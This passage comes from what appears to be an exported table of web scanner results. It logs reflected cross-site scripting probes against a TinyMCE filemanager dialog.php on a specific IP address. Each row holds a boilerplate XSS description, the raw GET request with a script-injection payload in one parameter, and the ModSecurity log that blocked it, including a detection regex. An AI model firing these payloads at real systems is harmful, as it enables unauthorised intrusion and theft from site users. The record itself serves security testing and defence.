&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >popup</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=&quot;&gt;&lt;script&gt;alert(563399)&lt;/script&gt;&lt;!--&amp;crossdomain=0&amp;field_id=100&amp;relative_0=TestName&amp;akey=key&amp;fldr=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=0n8sh4s0q0ecq3adhmrnc9q3n4
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:27:15</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:27:14 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:popup. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(563399)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtsmqwQAW0AAHhB77EAAAAD&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtsmqwQAW0AAHhB77EAAAAD</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366787</td><td class=xl24 width=64 >2015-03-31 19:26:41</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >crossdomain</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=&quot;&gt;&lt;script&gt;alert(254199)&lt;/script&gt;&lt;!--&amp;field_id=100&amp;relative_0=TestName&amp;akey=key&amp;fldr=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=h2m862ifkg48b0ik0spuh71ck7
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:27:16</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:27:15 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:crossdomain. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(254199)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtsm6wQAW0AABt@bVgAAAAB&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtsm6wQAW0AABt@bVgAAAAB</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366788</td><td class=xl24 width=64 >2015-03-31 19:26:49</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=&amp;551ac1cc4bcfb</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >lang</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=&quot;&gt;&lt;script&gt;alert(958699)&lt;/script&gt;&lt;!--&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_0=TestName&amp;akey=key&amp;fldr=TestName&amp;551ac1cc4bcfb=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=1jai6lbethan07nijui1jvkb24
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:27:18</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:27:16 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:lang. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(958699)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtsnKwQAW0AAHchlVAAAAAE&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtsnKwQAW0AAHchlVAAAAAE</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366789</td><td class=xl24 width=64 >2015-03-31 19:33:32</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >relative_0</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_0='&gt;&lt;script&gt;alert(803899)&lt;/script&gt;&lt;!--&amp;akey=key&amp;fldr=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=1b5e3tupcah69tv4mce4g0cth0
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:27:19</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:27:18 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:relative_0. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;'&gt;&lt;script&gt;alert(803899)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtsnqwQAW0AAHgzv0IAAAAG&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtsnqwQAW0AAHgzv0IAAAAG</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366790</td><td class=xl24 width=64 >2015-03-31 19:34:20</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=&amp;551ac1cc4bcfb</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >popup</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup='&gt;&lt;script&gt;alert(655099)&lt;/script&gt;&lt;!--&amp;crossdomain=0&amp;field_id=100&amp;relative_0=TestName&amp;akey=key&amp;fldr=TestName&amp;551ac1cc4bcfb=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=905k6duo3sikpg1ia8hs97sh13
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:27:20</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:27:19 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:popup. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;'&gt;&lt;script&gt;alert(655099)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtsn6wQAW0AAB7zKM8AAAAF&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtsn6wQAW0AAB7zKM8AAAAF</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366791</td><td class=xl24 width=64 >2015-03-31 19:35:17</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=test/&amp;551ac1cc893bd</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >type</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=&lt;script&gt;prompt(849299)&lt;/script/&gt;&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_0=TestName&amp;akey=key&amp;fldr=test/&amp;551ac1cc893bd=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=9vd5s10fint0nfgtv4u46gi394
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:27:21</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:27:20 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:type. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;&lt;script&gt;prompt(849299)&lt;/script/&gt;&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtsoKwQAW0AAHhGMtgAAAAK&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtsoKwQAW0AAHhGMtgAAAAK</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366792</td><td class=xl24 width=64 >2015-03-31 19:37:45</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=test/&amp;551ac1cc89409</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >type</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type='&gt;&lt;script&gt;alert(424699)&lt;/script&gt;&lt;!--&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_0=TestName&amp;akey=key&amp;fldr=test/&amp;551ac1cc89409=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=hcn3afejrvbfv1pjd56hbk6544
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:27:23</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:27:21 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:type. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;'&gt;&lt;script&gt;alert(424699)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtsoawQAW0AAHzDqr4AAAAH&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtsoawQAW0AAHzDqr4AAAAH</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366793</td><td class=xl24 width=64 >2015-03-31 19:38:43</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >akey</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_0=TestName&amp;akey='&gt;&lt;script&gt;alert(275799)&lt;/script&gt;&lt;!--&amp;fldr=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=fvco925djm81rrbiitef7l85v0
Connection: Close

